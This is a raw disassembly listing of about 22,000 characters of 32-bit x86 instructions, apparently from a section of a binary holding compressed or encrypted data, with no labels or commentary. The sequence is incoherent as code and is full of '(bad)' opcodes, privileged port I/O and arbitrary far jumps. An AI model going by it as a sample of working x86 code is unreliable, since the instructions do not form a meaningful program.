  414aaa:	inc    edx
  414aab:	xor    edx,eax
  414aad:	cmc    
  414aae:	jle    0x414ab4
  414ab0:	shl    BYTE PTR [edx+0x5c],0xf0
  414ab4:	aaa    
  414ab5:	inc    eax
  414ab6:	xor    BYTE PTR [edx-0x172aa20],al
  414abc:	fld    TBYTE PTR [ebp+0x3d38c0fc]
  414ac2:	adc    BYTE PTR [eax],bl
  414ac4:	mov    ah,0x1b
  414ac6:	arpl   WORD PTR [ebx-0x24],ax
  414ac9:	test   BYTE PTR [edx-0x57],cl
  414acc:	mov    edi,0xf294a3c1
  414ad1:	enter  0xb351,0x1d
  414ad5:	inc    esp
  414ad6:	pop    esp
  414ad7:	std    
  414ad8:	mov    dl,0xf9
  414ada:	cld    
  414adb:	int    0xc6
  414add:	ret    0xab2b
  414ae0:	ins    BYTE PTR es:[edi],dx
  414ae1:	ds inc edi
  414ae3:	mov    ebp,0x61d753ff
  414ae8:	(bad)
  414aed:	push   ebp
  414aee:	ficomp WORD PTR [edx-0x38]
  414af1:	cs push ss
  414af3:	test   BYTE PTR [ecx],dl
  414af5:	dec    esp
  414af6:	pop    edx
  414af7:	push   esp
  414af8:	adc    dh,al
  414afa:	cmp    al,0xc6
  414afc:	ret    0xf99a
  414aff:	jmp    0xa13c:0xa97d628
  414b06:	push   ebx
  414b07:	or     DWORD PTR [ecx],ebp
  414b09:	xchg   esp,eax
  414b0a:	push   eax
  414b0b:	push   eax
  414b0c:	cmc    
  414b0d:	enter  0x3594,0xa4
  414b11:	push   eax
  414b12:	dec    esi
  414b13:	mov    ds:0x8477e78f,al
  414b18:	out    dx,eax
  414b19:	xlat   BYTE PTR ds:[ebx]
  414b1a:	in     eax,0x88
  414b1c:	enter  0x7b57,0x8b
  414b20:	sbb    DWORD PTR [eax-0x1ba077ef],eax
  414b26:	jbe    0x414aad
  414b28:	mov    ebx,0xc6b87301
  414b2d:	lock mov bh,0xd3
  414b30:	imul   edx,ebx,0xffffff94
  414b33:	stos   BYTE PTR es:[edi],al
  414b34:	push   ss
  414b35:	lahf   
  414b36:	mov    ebp,0x8d30bc9b
  414b3b:	inc    ebp
  414b3c:	dec    esi
  414b3d:	outs   dx,DWORD PTR ds:[esi]
  414b3e:	fisub  DWORD PTR [ebx+esi*4+0x38b0ea72]
  414b45:	ja     0x414b25
  414b47:	mov    ebx,0xa6100bba
  414b4c:	sbb    al,0xee
  414b4e:	out    0xa1,eax
  414b50:	jg     0x414ae9
  414b52:	mov    ecx,0xbd1857bb
  414b57:	arpl   sp,si
  414b59:	sub    dl,dh
  414b5b:	mov    bh,0x99
  414b5d:	jb     0x414bc1
  414b5f:	ret    0x4243
  414b62:	scas   al,BYTE PTR es:[edi]
  414b63:	out    0xe9,al
  414b65:	jae    0x414b28
  414b67:	sti    
  414b68:	adc    eax,ebx
  414b6a:	inc    ebx
  414b6b:	xor    BYTE PTR [edx+0x69],dl
  414b6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b6f:	push   esp
  414b70:	sbb    DWORD PTR [ecx+ecx*2],ebx
  414b73:	cmp    esi,DWORD PTR [ebx-0x41fa6bf9]
  414b79:	mov    ch,0xfd
  414b7b:	push   ss
  414b7c:	sub    BYTE PTR [ecx-0x50],0xd0
  414b80:	daa    
  414b81:	adc    ah,BYTE PTR [edi-0x14]
  414b84:	in     eax,dx
  414b85:	hlt    
  414b86:	push   edx
  414b87:	in     al,dx
  414b88:	js     0x414b17
  414b8a:	ins    BYTE PTR es:[edi],dx
  414b8b:	lock les ecx,FWORD PTR [ebx+0x4c]
  414b8f:	jg     0x414bbb
  414b91:	push   0xfffffff5
  414b93:	jo     0x414b20
  414b95:	ja     0x414b27
  414b97:	out    0x2b,eax
  414b99:	push   es
  414b9a:	call   0x494af32b
  414b9f:	sbb    bh,al
  414ba1:	push   cs
  414ba2:	mov    DWORD PTR [edx+0x6],ecx
  414ba5:	and    al,0x3f
  414ba7:	add    ch,ah
  414ba9:	xchg   ebx,eax
  414baa:	mov    ebx,0xb0800d0f
  414baf:	loope  0x414c1e
  414bb1:	push   edi
  414bb2:	imul   DWORD PTR [ebx-0x6f]
  414bb5:	dec    edx
  414bb6:	mov    dl,0x11
  414bb8:	dec    edx
  414bb9:	fimul  DWORD PTR [edi+0x357c8aba]
  414bbf:	ins    BYTE PTR es:[edi],dx
  414bc0:	imul   esp,DWORD PTR cs:[eax],0x999a5ef7
  414bc7:	call   0x9233:0x859eca05
  414bce:	inc    edx
  414bcf:	pop    edx
  414bd0:	inc    eax
  414bd1:	mov    edx,0x7fde8616
  414bd6:	mov    es,WORD PTR [ecx]
  414bd8:	fs dec ebx
  414bda:	test   ebx,0x6e1f092
  414be0:	mov    esi,0xee83b841
  414be5:	vmread DWORD PTR [ebx-0x2283aaa6],esi
  414bec:	push   eax
  414bed:	stos   DWORD PTR es:[edi],eax
  414bee:	enter  0xc8ab,0x54
  414bf2:	xor    al,0x95
  414bf4:	push   cs
  414bf5:	push   0x1
  414bf7:	mov    bl,BYTE PTR [eax-0x3c0421f1]
  414bfd:	aaa    
  414bfe:	xor    dh,BYTE PTR [eax+0x33]
  414c01:	push   esi
  414c02:	lea    edx,[edi+esi*4]
  414c05:	inc    edi
  414c06:	data16 das 
  414c08:	fldcw  WORD PTR [ebp+0xf]
  414c0b:	push   esp
  414c0c:	ja     0x414c0f
  414c0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c0f:	pop    edx
  414c10:	inc    eax
  414c11:	pushf  
  414c12:	inc    edi
  414c13:	scas   eax,DWORD PTR es:[edi]
  414c14:	scas   al,BYTE PTR es:[edi]
  414c15:	jge    0x414c8b
  414c17:	mov    ecx,0x55e70bf4
  414c1c:	js     0x414c27
  414c1e:	push   eax
  414c1f:	dec    ebx
  414c20:	fdivr  DWORD PTR [eax-0x47]
  414c23:	aam    0x12
  414c25:	dec    eax
  414c26:	jp     0x414c4b
  414c28:	push   eax
  414c29:	cmc    
  414c2a:	test   eax,0x561111eb
  414c2f:	fisubr WORD PTR [ebp+0x11f6c9e5]
  414c35:	xchg   DWORD PTR [eax-0x19],ecx
  414c38:	lea    esi,[edx]
  414c3a:	ins    DWORD PTR es:[edi],dx
  414c3b:	push   edx
  414c3c:	cmp    esp,esi
  414c3e:	sub    ebx,esi
  414c40:	lahf   
  414c41:	gs push ds
  414c43:	adc    al,0x0
  414c45:	cmp    DWORD PTR [ebp-0x75bccd05],esp
  414c4b:	inc    edi
  414c4c:	xchg   edi,eax
  414c4d:	pop    esp
  414c4e:	popf   
  414c4f:	cmp    eax,0x11c950cf
  414c54:	mov    ch,bl
  414c56:	int3   
  414c57:	mov    dh,0xfc
  414c59:	out    0x2,al
  414c5b:	arpl   WORD PTR [edi],si
  414c5d:	fwait
  414c5e:	push   ebx
  414c5f:	cmp    ebp,ebp
  414c61:	adc    al,0x6
  414c63:	xor    eax,0xc284c8e3
  414c68:	rcl    DWORD PTR [esi+0x69],cl
  414c6b:	dec    ebp
  414c6c:	fcomp  DWORD PTR [edx+ecx*8]
  414c6f:	test   al,0xf1
  414c71:	fcomp  QWORD PTR [esi]
  414c73:	pop    es
  414c74:	dec    edi
  414c75:	int3   
  414c76:	cmp    esi,DWORD PTR [eax]
  414c78:	push   eax
  414c79:	xor    cl,BYTE PTR [ecx-0x23]
  414c7c:	hlt    
  414c7d:	sbb    dl,al
  414c7f:	std    
  414c80:	(bad)  
  414c82:	cmp    ah,ah
  414c84:	(bad)  
  414c85:	nop
  414c86:	push   ebx
  414c87:	and    eax,0xe951a1e9
  414c8c:	and    eax,0xa30f7c64
  414c91:	(bad)  
  414c93:	mov    WORD PTR [eax+0x3b],gs
  414c96:	das    
  414c97:	dec    ecx
  414c98:	lock jns 0x414cb7
  414c9b:	jno    0x414cc5
  414c9d:	or     BYTE PTR [edi],dh
  414c9f:	out    dx,eax
  414ca0:	push   ss
  414ca1:	stos   BYTE PTR es:[edi],al
  414ca2:	loopne 0x414c6b
  414ca4:	fcom   st(1)
  414ca6:	out    dx,eax
  414ca7:	aas    
  414ca8:	pop    edi
  414ca9:	(bad)  
  414caa:	(bad)  [edi+0x1263599f]
  414cb0:	scas   al,BYTE PTR es:[edi]
  414cb1:	jo     0x414cfb
  414cb3:	mov    cl,0xaa
  414cb5:	add    DWORD PTR [edx],esi
  414cb7:	inc    esi
  414cb8:	fmul   QWORD PTR [ebp-0x3132ca0b]
  414cbe:	bound  dx,DWORD PTR [eax+0x27b0c80b]
  414cc5:	mov    edx,0x774b141f
  414cca:	inc    ecx
  414ccb:	fwait
  414ccc:	in     eax,dx
  414ccd:	mov    ds:0xa07ec9c2,al
  414cd3:	jae    0x414ce8
  414cd5:	ret    
  414cd6:	mov    esp,0x9d39c1b5
  414cdb:	cmc    
  414cdc:	lock mov esi,0xa372905f
  414ce2:	mov    esi,0xf6315068
  414ce7:	retf   
  414ce8:	ins    DWORD PTR es:[edi],dx
  414ce9:	sbb    eax,0xe533b18b
  414cee:	adc    ebp,DWORD PTR [ebx-0x1bef5ba6]
  414cf4:	imul   ebx,DWORD PTR [edx],0xc3843b3f
  414cfa:	jno    0x414d77
  414cfc:	pop    esi
  414cfd:	pop    edx
  414cfe:	xor    eax,0x98b93681
  414d03:	jmp    0x77cb:0xbd4a61be
  414d0a:	mov    cl,0xc4
  414d0c:	xchg   esi,eax
  414d0d:	dec    ebx
  414d0e:	movups XMMWORD PTR [edx],xmm7
  414d11:	jge    0x414ccd
  414d13:	stos   BYTE PTR es:[edi],al
  414d14:	mov    cs,WORD PTR [eax]
  414d16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d17:	cli    
  414d18:	daa    
  414d19:	data16 scas al,BYTE PTR es:[edi]
  414d1b:	inc    edi
  414d1c:	lock jecxz 0x414d4c
  414d1f:	add    al,0x1c
  414d21:	lds    esi,FWORD PTR [ecx]
  414d23:	lods   eax,DWORD PTR ds:[esi]
  414d24:	push   ebx
  414d25:	(bad)  
  414d26:	jmp    0xd266d001
  414d2b:	sbb    BYTE PTR [eax-0x3b],dh
  414d2e:	aaa    
  414d2f:	xor    ebp,DWORD PTR [edi+ecx*1-0x72]
  414d33:	mov    ds:0x708e3b1a,eax
  414d38:	xor    al,0xb
  414d3a:	(bad)  
  414d3b:	mov    esp,0xab3acf94
  414d40:	and    BYTE PTR [eax+eiz*4],dl
  414d43:	arpl   WORD PTR ss:[ecx],bp
  414d46:	rcr    BYTE PTR [eax+edi*1],cl
  414d49:	cs je  0x414cf4
  414d4c:	xchg   ecx,eax
  414d4d:	(bad)  
  414d4e:	ror    bl,1
  414d50:	(bad)  
  414d51:	stos   BYTE PTR es:[edi],al
  414d52:	lahf   
  414d53:	xor    eax,ecx
  414d55:	adc    ecx,DWORD PTR ds:0xa8222898
  414d5b:	mov    esp,0x6f34e1a3
  414d60:	repnz add edi,DWORD PTR [ebp+0x105e727a]
  414d67:	test   esi,edi
  414d69:	cmp    edx,eax
  414d6b:	mov    ch,0x35
  414d6d:	pop    ecx
  414d6e:	adc    BYTE PTR [esi+0x6e4285c0],ah
  414d74:	int3   
  414d75:	mov    ecx,0xf3a0cd99
  414d7a:	sbb    BYTE PTR [edi+0x7bcf0c77],al
  414d80:	enter  0x4dd8,0x98
  414d84:	outs   dx,BYTE PTR ds:[esi]
  414d85:	adc    dh,BYTE PTR [esi+0x529fdf79]
  414d8b:	dec    esi
  414d8c:	cmc    
  414d8d:	inc    esp
  414d8e:	stc    
  414d8f:	int3   
  414d90:	mov    ds:0x53b95707,eax
  414d95:	fiadd  WORD PTR [edi+0x7a]
  414d98:	lahf   
  414d99:	adc    BYTE PTR [ebx+0x60db873d],bh
  414d9f:	stos   BYTE PTR es:[edi],al
  414da0:	out    dx,al
  414da1:	jo     0x414e22
  414da3:	retf   
  414da4:	sub    DWORD PTR [edx],edi
  414da6:	(bad)
  414da9:	mov    al,ds:0x85faa53a
  414dae:	mov    ecx,DWORD PTR [esi-0x1ab55c91]
  414db4:	inc    sp
  414db6:	fwait
  414db7:	mov    bh,BYTE PTR [edi+eiz*4]
  414dba:	fwait
  414dbb:	pop    esi
  414dbc:	sub    eax,0xca2f70ee
  414dc1:	mov    edx,0x7395a367
  414dc6:	pop    ebx
  414dc7:	adc    esi,DWORD PTR ds:0xdadc3eff
  414dcd:	xor    esi,0x23
  414dd0:	and    eax,0xab84472f
  414dd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dd6:	nop
  414dd7:	jb     0x414e14
  414dd9:	add    ebx,DWORD PTR [eax+0x3b]
  414ddc:	push   cs
  414ddd:	mov    ?,WORD PTR [ebx-0x13]
  414de0:	push   edi
  414de1:	and    DWORD PTR [edx+0x6e15daae],eax
  414de7:	jmp    0xd4d8:0x9a96a6db
  414dee:	mov    dh,0x19
  414df0:	jecxz  0x414df8
  414df2:	fmul   st,st(5)
  414df4:	and    edi,DWORD PTR ds:[esi+0x710edb42]
  414dfb:	jl     0x414e64
  414dfd:	outs   dx,BYTE PTR ds:[esi]
  414dfe:	(bad)  
  414dff:	xor    eax,0xcd4f14b5
  414e04:	cdq    
  414e05:	loope  0x414d95
  414e07:	xor    cl,cl
  414e09:	mov    eax,ds:0x74959494
  414e0e:	jmp    0x414e46
  414e10:	pslld  mm1,QWORD PTR [eax+0x53bb95fa]
  414e17:	rol    BYTE PTR [edi],1
  414e19:	test   al,0x76
  414e1b:	fdiv   DWORD PTR fs:[ebx-0x77e1fa87]
  414e22:	(bad)  
  414e23:	cmp    al,0xaf
  414e25:	je     0x414e42
  414e27:	fstp   TBYTE PTR [esi+0x1b0d411f]
  414e2d:	int    0x5d
  414e2f:	adc    al,0x7a
  414e31:	adc    eax,DWORD PTR [edx]
  414e33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e34:	jecxz  0x414df7
  414e36:	sub    eax,esp
  414e38:	push   ss
  414e39:	into   
  414e3a:	inc    edi
  414e3b:	cmp    DWORD PTR [ebp-0x15],eax
  414e3e:	pop    eax
  414e3f:	cwde   
  414e40:	outs   dx,DWORD PTR ds:[esi]
  414e41:	daa    
  414e42:	xor    eax,0x25b3d36e
  414e47:	aam    0xba
  414e49:	ret    0x2155
  414e4c:	pop    ss
  414e4d:	dec    ebx
  414e4e:	sbb    al,0x58
  414e50:	stos   BYTE PTR es:[edi],al
  414e51:	mov    edi,esi
  414e53:	(bad)  
  414e54:	mov    dh,0x92
  414e56:	xchg   edi,eax
  414e57:	(bad)  
  414e58:	sbb    eax,0xe58b33d0
  414e5d:	(bad)  [eax-0x32]
  414e60:	(bad)  
  414e61:	dec    ebx
  414e62:	ss xor ch,ch
  414e65:	hlt    
  414e66:	jno    0x414e89
  414e68:	mov    dh,0x2f
  414e6a:	jae    0x414e7d
  414e6c:	adc    DWORD PTR [edx+0x5b],esi
  414e6f:	dec    esp
  414e70:	sub    DWORD PTR [ebx+0x48],esi
  414e73:	fdivr  st(6),st
  414e75:	mov    dh,BYTE PTR [edi]
  414e77:	int    0x96
  414e79:	mov    ah,0xb4
  414e7b:	stos   DWORD PTR es:[edi],eax
  414e7c:	adc    DWORD PTR [esi+edx*1],ebx
  414e7f:	cwde   
  414e80:	xor    al,BYTE PTR [eax]
  414e82:	inc    edx
  414e83:	retf   0x8ae5
  414e86:	sbb    BYTE PTR [edi+0x1a],0xa4
  414e8a:	sub    DWORD PTR [edx],eax
  414e8c:	jnp    0x414ebf
  414e8e:	scas   al,BYTE PTR es:[edi]
  414e8f:	mov    ch,0x9e
  414e91:	iret   
  414e92:	push   0xbe52a587
  414e97:	sbb    BYTE PTR [eax-0x7b467f65],0x25
  414e9e:	push   0xc302fe5e
  414ea3:	shr    BYTE PTR [esi],cl
  414ea5:	out    0xf9,eax
  414ea7:	ins    DWORD PTR es:[edi],dx
  414ea8:	mov    ch,BYTE PTR [ecx]
  414eaa:	mov    ecx,0x3055059
  414eaf:	add    eax,0x71008183
  414eb4:	in     eax,dx
  414eb5:	iret   
  414eb6:	cs cld 
  414eb8:	lea    edx,[ecx]
  414eba:	jle    0x414f14
  414ebc:	push   esp
  414ebd:	and    eax,0x81306a26
  414ec2:	and    al,0x33
  414ec4:	or     DWORD PTR [edi],esi
  414ec6:	add    ch,al
  414ec8:	test   BYTE PTR [eax-0xf],bl
  414ecb:	pop    esp
  414ecc:	pop    ss
  414ecd:	push   edx
  414ece:	fwait
  414ecf:	jmp    0xdd77:0xedd9d51f
  414ed6:	inc    ecx
  414ed7:	xchg   edx,eax
  414ed8:	icebp  
  414ed9:	push   ecx
  414eda:	or     eax,DWORD PTR [edi+ebx*1-0x7e9f986a]
  414ee1:	inc    esi
  414ee2:	xchg   BYTE PTR [esi+0x21],dl
  414ee5:	pushf  
  414ee6:	leave  
  414ee7:	xchg   esi,eax
  414ee8:	loope  0x414ead
  414eea:	cwde   
  414eeb:	mov    ah,0xe8
  414eed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eee:	(bad)  
  414ef0:	jl     0x414ea4
  414ef2:	dec    eax
  414ef3:	pushf  
  414ef4:	jmp    DWORD PTR [edi]
  414ef6:	ret    0xb61a
  414ef9:	or     eax,0x1e8bfd3c
  414efe:	sbb    bl,BYTE PTR [ecx]
  414f00:	jle    0x414f56
  414f02:	stos   DWORD PTR es:[edi],eax
  414f03:	arpl   bp,sp
  414f05:	or     esi,ecx
  414f07:	shr    BYTE PTR [ebx],0x5a
  414f0a:	fstp   QWORD PTR [edi+0x16718628]
  414f10:	mov    cl,0x57
  414f12:	ja     0x414f8b
  414f14:	aad    0x7d
  414f16:	adc    DWORD PTR [esi+0x5711c4e7],ebp
  414f1c:	loop   0x414f6a
  414f1e:	outs   dx,DWORD PTR ds:[esi]
  414f1f:	in     eax,0x26
  414f21:	es mov dl,0x32
  414f24:	scas   eax,DWORD PTR es:[edi]
  414f25:	xchg   esi,eax
  414f26:	push   ds
  414f27:	rcr    BYTE PTR [esi+edx*4-0x40731cdd],cl
  414f2e:	lods   al,BYTE PTR ds:[esi]
  414f2f:	pusha  
  414f30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f31:	test   DWORD PTR [eax],edx
  414f33:	sar    esp,1
  414f35:	hlt    
  414f36:	aam    0x76
  414f38:	cs fs jle 0x6a62faa8
  414f40:	fld    TBYTE PTR [ebx+ecx*1+0x17]
  414f44:	jp     0x414fae
  414f46:	mov    dl,0xe
  414f48:	out    0xf2,al
  414f4a:	test   eax,0xf2781c5e
  414f4f:	pop    ebx
  414f50:	test   al,0x71
  414f52:	fwait
  414f53:	pop    ecx
  414f54:	ret    
  414f55:	pop    eax
  414f56:	jae    0x414fa2
  414f58:	repz ret 0x2b02
  414f5c:	cmp    al,0x51
  414f5e:	adc    ebx,DWORD PTR [esp+edx*4]
  414f61:	test   eax,0xe475ed9c
  414f66:	inc    edi
  414f67:	jmp    0x414fc3
  414f69:	sbb    BYTE PTR [eax+0x2ee23294],0x33
  414f70:	out    dx,al
  414f71:	xchg   edi,eax
  414f72:	in     eax,dx
  414f73:	push   ss
  414f74:	dec    ebx
  414f75:	xlat   BYTE PTR ds:[ebx]
  414f76:	loop   0x414fe0
  414f78:	test   ebp,eax
  414f7a:	xchg   esi,eax
  414f7b:	sbb    ecx,eax
  414f7d:	ret    
  414f7e:	ins    BYTE PTR es:[edi],dx
  414f7f:	inc    edx
  414f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f81:	sbb    BYTE PTR [edx-0x7ea278bb],bh
  414f87:	test   DWORD PTR [ebx+edx*2+0x44521975],edi
  414f8e:	lods   eax,DWORD PTR ds:[esi]
  414f8f:	mov    bh,0xe7
  414f91:	mov    bh,0x79
  414f93:	sbb    ecx,DWORD PTR [edx-0x55]
  414f96:	jns    0x414f88
  414f98:	pop    edx
  414f99:	mov    bl,0xe7
  414f9b:	and    dh,bl
  414f9d:	inc    eax
  414f9e:	jne    0x414f24
  414fa0:	test   DWORD PTR [esi-0x6f],edx
  414fa3:	cwde   
  414fa4:	push   0x8dac3d8c
  414fa9:	pop    ebp
  414faa:	leave  
  414fab:	hlt    
  414fac:	add    BYTE PTR [edx],bl
  414fae:	imul   BYTE PTR [edi+0x93870c0]
  414fb4:	int    0xe9
  414fb6:	mov    bl,0x66
  414fb8:	outs   dx,DWORD PTR ds:[esi]
  414fb9:	in     eax,0x9f
  414fbb:	add    bh,bl
  414fbd:	dec    esp
  414fbe:	xlat   BYTE PTR ds:[ebx]
  414fbf:	xor    BYTE PTR [ecx-0x7ff2c943],ch
  414fc5:	xchg   edx,eax
  414fc6:	scas   al,BYTE PTR es:[edi]
  414fc7:	dec    edx
  414fc8:	cs jns 0x414fcf
  414fcb:	ficomp WORD PTR [ebp+0x79]
  414fce:	imul   ebx,DWORD PTR [ecx-0x37],0xffffff85
  414fd2:	lods   eax,DWORD PTR ds:[esi]
  414fd3:	aas    
  414fd4:	xchg   ah,bh
  414fd6:	fistp  DWORD PTR [esi+eiz*8-0x1]
  414fda:	xchg   edx,eax
  414fdb:	call   0x7661:0xf9c039c5
  414fe2:	sbb    al,0x93
  414fe4:	bound  ebp,QWORD PTR [ecx-0x7f]
  414fe7:	iret   
  414fe8:	aaa    
  414fe9:	cmp    BYTE PTR [ecx+ecx*8-0x10],0xa1
  414fee:	hlt    
  414fef:	je     0x414fb7
  414ff1:	mov    ebp,0x9a8aea62
  414ff6:	bound  esi,QWORD PTR [ebx+0x40]
  414ff9:	call   0x19512334
  414ffe:	in     eax,dx
  414fff:	cmp    edi,0x25
  415002:	popa   
  415003:	call   0xd791dee9
  415008:	sub    al,0x4
  41500a:	dec    BYTE PTR ds:0x26012200
  415010:	jmp    0xf60c2891
  415015:	sub    DWORD PTR ds:0xf7b73494,esi
  41501b:	mov    ah,0x2c
  41501d:	or     dh,al
  41501f:	sub    BYTE PTR [edx+0x14],ch
  415022:	xchg   edi,eax
  415023:	push   ebp
  415024:	jecxz  0x414fdf
  415026:	sar    DWORD PTR [ebp+ebx*1+0x78a1e94],0xdc
  41502e:	xchg   ebp,eax
  41502f:	xchg   DWORD PTR ss:[eax-0x52],ebp
  415033:	into   
  415034:	call   0x183:0xe57c4e24
  41503b:	inc    edx
  41503c:	les    edi,FWORD PTR [ebp+0x27]
  41503f:	and    eax,0xc7d28178
  415044:	mov    bp,0x49d7
  415048:	imul   ecx,DWORD PTR [ebx+ecx*4],0xffffff80
  41504c:	or     esp,edi
  41504e:	(bad)  
  415050:	gs xchg edx,eax
  415052:	ins    DWORD PTR es:[edi],dx
  415053:	lds    esi,FWORD PTR [eiz*1-0x16fcd64d]
  41505a:	jle    0x415007
  41505c:	inc    edi
  41505d:	jne    0x414fe0
  41505f:	push   ds
  415060:	cmp    dh,BYTE PTR [ecx]
  415062:	data16 in al,0xe3
  415065:	cmc    
  415066:	scas   al,BYTE PTR es:[edi]
  415067:	add    cl,dh
  415069:	in     eax,dx
  41506a:	and    edi,DWORD PTR [edx]
  41506c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41506d:	test   al,0xe7
  41506f:	mov    DWORD PTR [ebp+0x33],ebp
  415072:	adc    al,0x55
  415074:	in     eax,dx
  415075:	or     BYTE PTR [edi+0x72eb41a2],dl
  41507b:	mov    ebx,0xc12e3501
  415080:	sar    DWORD PTR [ecx+0x6be918b],cl
  415086:	cs pop edi
  415088:	pop    ebp
  415089:	mov    BYTE PTR [ebx-0xd0d38a0],cl
  41508f:	(bad)  [esp+eiz*8]
  415092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415093:	jmp    0x6292:0xdc09b6cc
  41509a:	and    BYTE PTR [ebp-0x70a5e667],0x6b
  4150a1:	das    
  4150a2:	inc    edi
  4150a3:	outs   dx,BYTE PTR ds:[esi]
  4150a4:	and    BYTE PTR [edi],bh
  4150a6:	test   eax,0x33722e43
  4150ab:	xor    eax,DWORD PTR [ebp+0x59869f2e]
  4150b1:	popa   
  4150b2:	ficomp DWORD PTR [ecx]
  4150b4:	int3   
  4150b5:	jns    0x415039
  4150b7:	arpl   WORD PTR [esi-0x7386801c],bx
  4150bd:	(bad)  
  4150be:	ss hlt 
  4150c0:	out    0x8a,al
  4150c2:	push   ebp
  4150c3:	ret    0xc935
  4150c6:	fdiv   QWORD PTR [ebp-0x74]
  4150c9:	call   0x246ff3b8
  4150ce:	and    eax,DWORD PTR [edx]
  4150d0:	jo     0x4150f1
  4150d2:	nop
  4150d3:	aas    
  4150d4:	jp     0x415077
  4150d6:	dec    ecx
  4150d7:	test   DWORD PTR [eax],esi
  4150d9:	stc    
  4150da:	std    
  4150db:	sbb    ebp,eax
  4150dd:	dec    esp
  4150de:	test   eax,0xbf01e4a6
  4150e3:	into   
  4150e4:	ins    BYTE PTR es:[edi],dx
  4150e5:	pop    ebp
  4150e6:	xor    ebp,edi
  4150e8:	pop    es
  4150e9:	rcl    DWORD PTR [eax],0x6a
  4150ec:	xor    al,0xd9
  4150ee:	pop    edx
  4150ef:	xchg   BYTE PTR [edx-0x77],bl
  4150f2:	addr16 repz out 0xa5,eax
  4150f6:	adc    BYTE PTR [ebx-0x6b1ce2ea],dh
  4150fc:	aaa    
  4150fd:	rol    BYTE PTR [eax-0x77],cl
  415100:	mov    ?,esi
  415102:	popf   
  415103:	xchg   DWORD PTR [edx],eax
  415105:	sub    edi,DWORD PTR [eax]
  415107:	or     al,BYTE PTR [ebx+0x32]
  41510a:	lahf   
  41510b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41510c:	xorps  xmm2,XMMWORD PTR [si]
  415110:	cmp    DWORD PTR [ecx+0x36],edx
  415113:	fisttp WORD PTR [ebx]
  415115:	inc    edi
  415116:	xor    BYTE PTR [ecx+eax*1-0x59],0x60
  41511b:	pop    esp
  41511c:	jmp    0xd342:0xfcaeb186
  415123:	pop    esi
  415124:	and    al,0x25
  415126:	jne    0x4151a3
  415128:	shr    eax,cl
  41512a:	stos   BYTE PTR es:[edi],al
  41512b:	jne    0x41517f
  41512d:	pop    ebp
  41512e:	xor    DWORD PTR [esp+ebx*4+0x31ca6bc],ecx
  415135:	enter  0x6344,0x83
  415139:	into   
  41513a:	mov    ch,0xd8
  41513c:	dec    esi
  41513d:	das    
  41513e:	or     BYTE PTR [ecx+0x3272939a],dh
  415144:	pop    ds
  415145:	jge    0x41516c
  415147:	daa    
  415148:	push   ebx
  415149:	cs mov bh,0xcf
  41514c:	pop    ecx
  41514d:	mov    al,0xa8
  41514f:	inc    eax
  415150:	fchs   
  415152:	jae    0x415198
  415154:	dec    esp
  415155:	cmovae edx,DWORD PTR [esi]
  415158:	sbb    WORD PTR [edi-0x6a],0x3c74
  41515e:	jo     0x41513d
  415160:	pop    ecx
  415161:	adc    cl,BYTE PTR fs:[ecx]
  415164:	jns    0x415143
  415166:	jmp    0xe253ab22
  41516b:	aas    
  41516c:	and    ecx,DWORD PTR ds:0x885c2991
  415172:	jnp    0x415134
  415174:	dec    edi
  415175:	fmul   st,st(5)
  415177:	cmp    dl,BYTE PTR [edi]
  415179:	not    DWORD PTR [esi-0x4f]
  41517c:	bound  esp,QWORD PTR [edx+0x43c12fd2]
  415182:	and    BYTE PTR [esi],bl
  415184:	pop    esp
  415185:	fisttp DWORD PTR [ebx]
  415187:	adc    al,0x33
  415189:	scas   al,BYTE PTR es:[edi]
  41518a:	pushf  
  41518b:	lds    ebp,FWORD PTR [ebx]
  41518d:	loope  0x41518a
  41518f:	and    esi,ecx
  415191:	xchg   edx,eax
  415192:	aas    
  415193:	lea    ecx,[ecx]
  415195:	add    al,0x86
  415197:	pop    es
  415198:	(bad)  
  415199:	push   0x641ad088
  41519e:	jmp    0x5c41:0x40fb417e
  4151a5:	pop    edx
  4151a6:	sub    al,0x79
  4151a8:	popf   
  4151a9:	das    
  4151aa:	test   ebx,0x384bf1cb
  4151b0:	dec    ecx
  4151b1:	xor    ebp,DWORD PTR [eax+ebx*8-0x2e]
  4151b5:	(bad)  
  4151b6:	fwait
  4151b7:	add    BYTE PTR [ecx-0x27ea6641],bl
  4151bd:	(bad)  
  4151be:	xchg   esp,eax
  4151bf:	cld    
  4151c0:	fadd   QWORD PTR [edi+eiz*8-0x692f8c17]
  4151c7:	inc    esi
  4151c8:	lods   al,BYTE PTR ds:[esi]
  4151c9:	mov    bl,0xe6
  4151cb:	scas   al,BYTE PTR es:[edi]
  4151cc:	adc    BYTE PTR [ecx+0x6f],dl
  4151cf:	cmp    al,0x1c
  4151d1:	fmul   QWORD PTR [eax+0x14]
  4151d4:	data16 fcmovu st,st(2)
  4151d7:	jl     0x415233
  4151d9:	fs mov bl,0x72
  4151dc:	add    ebx,ebx
  4151de:	sbb    dh,BYTE PTR [ecx-0x4fef9c57]
  4151e4:	cmp    BYTE PTR [eax],ah
  4151e6:	and    dl,BYTE PTR [esi]
  4151e8:	jbe    0x41517e
  4151ea:	push   ebx
  4151eb:	inc    ebp
  4151ec:	sbb    eax,0x8d1dfe71
  4151f1:	and    ecx,DWORD PTR [edi-0x7ed79d8e]
  4151f7:	jns    0x4151df
  4151f9:	sbb    al,0xf
  4151fb:	popf   
  4151fc:	(bad)  
  4151fd:	cmc    
  4151fe:	push   ss
  4151ff:	loope  0x415189
  415201:	fstp   TBYTE PTR ds:0x10eed897
  415207:	lock neg ah
  41520a:	sbb    al,0x17
  41520c:	add    BYTE PTR [ecx],bh
  41520e:	xchg   ebp,eax
  41520f:	jge    0x41523c
  415211:	in     eax,0xdf
  415213:	data16 (bad) 
  415215:	fadd   QWORD PTR [eax+0x20]
  415218:	imul   ebx,DWORD PTR [eax],0x14
  41521b:	push   cs
  41521c:	mov    al,0x14
  41521e:	jo     0x4151f7
  415220:	push   ss
  415221:	sbb    al,0x19
